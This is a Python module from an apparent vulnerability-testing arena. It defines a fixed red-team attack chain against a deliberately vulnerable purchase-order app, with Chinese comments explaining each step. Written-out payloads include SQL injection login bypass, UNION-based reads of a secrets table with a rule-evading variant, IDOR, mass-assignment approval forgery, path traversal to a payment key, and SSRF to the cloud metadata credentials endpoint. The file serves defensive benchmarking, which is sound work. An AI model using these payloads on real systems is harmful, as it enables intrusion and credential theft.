"""Deterministic red team: a fixed chain that covers every defect class.

No model is involved. This is the baseline the arena must always be able to
reproduce offline, and the reference that a model-driven prober is measured against.
"""

import json
from collections.abc import Awaitable, Callable
from dataclasses import dataclass

from vulnarena.arena.context import ArenaContext, CallResult
from vulnarena.arena.contracts import HttpCall, ProbeTrace

NAIVE_UNION = "' UNION SELECT 1, value, 1, 'PAID', 'x' FROM secrets --"
MUTATED_UNION = "' UNION ALL SELECT 1, value, 1, 'PAID', 'x' FROM secrets --"

SuccessCheck = Callable[[CallResult], bool]


def _body(result: CallResult) -> dict:
    try:
        payload = json.loads(result.text)
    except ValueError:
        return {}
    return payload if isinstance(payload, dict) else {}


def exec_session(result: CallResult) -> bool:
    """登录绕过的成功信号：服务端返回了 cfo 角色。"""
    return result.status == 200 and _body(result).get("role") == "cfo"


def approved_as_someone_else(result: CallResult) -> bool:
    """批量赋值的成功信号：审批人变成了请求体里指定的名字。"""
    body = _body(result)
    approvals = body.get("approvals") or []
    return (
        result.status == 200
        and body.get("status") == "APPROVED"
        and any(item.get("actor") == "admin" for item in approvals)
    )


@dataclass(frozen=True)
class ChainStep:
    label: str
    category: str
    call: HttpCall
    reasoning: str
    success: SuccessCheck | None = None


CHAIN: list[ChainStep] = [
    ChainStep(
        "baseline: list purchase orders",
        "sqli",
        HttpCall(method="GET", path="/pos", params={"q": "设备"}, actor="alice"),
        "先确认接口可用，记下正常响应长什么样，后面所有判断都跟它比",
    ),
    ChainStep(
        "login bypass: become the CFO",
        "sqli",
        HttpCall(
            method="POST",
            path="/login",
            json_body={"username": "admin' --", "password": "whatever"},
            actor="anonymous",
        ),
        "登录框把用户名直接拼进 SQL，注释掉密码校验就能拿到高管会话",
        exec_session,
    ),
    ChainStep(
        "naive union on order search",
        "sqli",
        HttpCall(
            method="GET",
            path="/pos",
            params={"q": NAIVE_UNION, "page_size": "50"},
            actor="alice",
        ),
        "采购单搜索直接拼字符串，一次联合查询就能把 secrets 表读出来",
    ),
    ChainStep(
        "mutated union (UNION ALL)",
        "sqli",
        HttpCall(
            method="GET",
            path="/pos",
            params={"q": MUTATED_UNION, "page_size": "50"},
            actor="alice",
        ),
        "把 UNION SELECT 换成 UNION ALL SELECT，等价语法，初始规则没覆盖",
    ),
    ChainStep(
        "idor: read a foreign purchase order",
        "idor",
        HttpCall(method="GET", path="/pos/4", actor="bob"),
        "详情接口只校验「有没有登录」，不校验「是不是你的」，换个 id 就能看别人的预算科目",
    ),
    ChainStep(
        "mass assignment: approve as the CFO",
        "logic",
        HttpCall(
            method="POST",
            path="/pos/4/approve",
            json_body={"decision": "approve", "approver": "admin", "comment": "ok"},
            actor="alice",
        ),
        "审批接口信任请求体里的 approver，身份与状态机同时被绕过",
        approved_as_someone_else,
    ),
    ChainStep(
        "attachment traversal: read the bank key",
        "path_traversal",
        HttpCall(
            method="GET",
            path="/attachments",
            params={"name": "../etc/procure/bank_gateway_key"},
            actor="alice",
        ),
        "发票附件路径只做了字符串拼接，../ 跳出上传目录就能读到付款网关密钥",
    ),
    ChainStep(
        "ssrf: reach the metadata service",
        "ssrf",
        HttpCall(
            method="POST",
            path="/suppliers/1/callback-test",
            json_body={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
            actor="alice",
        ),
        "供应商回调地址测试没限制目标，直接打通内网元数据端点拿走临时凭证",
    ),
]

OnTrace = Callable[[ProbeTrace], Awaitable[None]]


class DeterministicAttacker:
    def __init__(self, ctx: ArenaContext, *, on_trace: OnTrace | None = None):
        self.ctx = ctx
        self.on_trace = on_trace

    async def run_one(self, item: ChainStep, step: int) -> ProbeTrace:
        result = await self.ctx.send(item.call)
        canary_hit = self.ctx.canary in result.text
        breached = canary_hit if item.success is None else item.success(result)
        trace = ProbeTrace(
            step=step,
            label=item.label,
            category=item.category,
            call=item.call,
            status=result.status,
            elapsed_ms=result.elapsed_ms,
            rule_id=result.rule_id,
            canary_hit=canary_hit,
            breached=breached,
            blocked_by=result.blocked_by,
            reasoning=item.reasoning,
        )
        if self.on_trace is not None:
            await self.on_trace(trace)
        return trace

    async def run(self, order: list[str] | None = None) -> list[ProbeTrace]:
        by_label = {item.label: item for item in CHAIN}
        sequence = [by_label[label] for label in (order or []) if label in by_label]
        if not sequence:
            sequence = list(CHAIN)
        traces: list[ProbeTrace] = []
        for step, item in enumerate(sequence, start=1):
            result = await self.ctx.send(item.call)
            canary_hit = self.ctx.canary in result.text
            breached = canary_hit if item.success is None else item.success(result)
            trace = ProbeTrace(
                step=step,
                label=item.label,
                category=item.category,
                call=item.call,
                status=result.status,
                elapsed_ms=result.elapsed_ms,
                rule_id=result.rule_id,
                canary_hit=canary_hit,
                breached=breached,
                blocked_by=result.blocked_by,
                reasoning=item.reasoning,
            )
            traces.append(trace)
            if self.on_trace is not None:
                await self.on_trace(trace)
        return traces
